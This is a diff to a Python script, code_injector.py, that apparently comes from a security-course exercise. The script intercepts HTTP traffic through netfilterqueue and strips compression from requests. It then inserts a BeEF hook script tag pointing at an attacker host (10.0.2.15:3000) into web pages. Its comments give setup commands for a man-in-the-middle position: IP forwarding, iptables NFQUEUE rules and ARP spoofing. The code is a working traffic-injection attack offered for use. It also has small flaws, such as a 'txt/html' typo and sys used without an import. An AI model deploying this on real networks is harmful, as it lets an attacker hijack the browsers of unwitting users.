@@ -1,12 +1,20 @@
 #!/usr/bin/env python
+# Description: This program inject code in http pages.
+#
+# Install Beef if neeeded (beef, toor) and use a webserver.
+# sudo pip install netfilterqueue               --> Install netfilterqueue
+# echo 1 > /proc/sys/net/ipv4/ip_forward        --> Ip forwarding for mitm.
+# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> For mitm. Trap all the packets that usually goes to the forward chain if it is are in the netfilter queue with queue number 0.
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> Use this and the next command instead if we are testing it in our own computer.
+# iptables -I INPUT -j NFQUEUE --queue-num 0    
+# python arp_spoof.py -t <target's ip> -s <router's ip>     --> Arp poisoning for mitm.
+# (iptables --flush                             --> back to normal)
+#
+# Usage:  python code_injector.py 
+# Usage: python3 code_injector.py 
 import netfilterqueue
 import scapy.all as scapy
 import re
-# First:
-# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm and with arp_spoof.py
-# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
-# iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
-# iptables flush  --> back to normal 
 
 
 def set_load(packet, load):
@@ -25,13 +33,13 @@ def process_packet(packet):
             load = scapy_packet[scapy.Raw].load  
             if scapy_packet[scapy.TCP].dport == 80:      
                 print("[+] Request")
-                # Delete Accept-Encoding and its content
+                # Delete Accept-Encoding and its content to get it in plain text
                 load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("[+] Response")
-                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
+                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'            
                 load = load.replace("</head>", injection_code + "</head>")
-                # The new load make it content-length bigger so we need to change it
+                # The new load make its content-length bigger so we need to change it
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                 if content_length_search and "txt/html" in load:
                     print("Old content_length: " + str(content_length_search.group(1)))
@@ -48,6 +56,19 @@ def process_packet(packet):
 
     packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+
+def main():
+    global ack_list
+    ack_list = []
+
+    try:    
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[+] Detected CTRL+C -> Quitting")
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
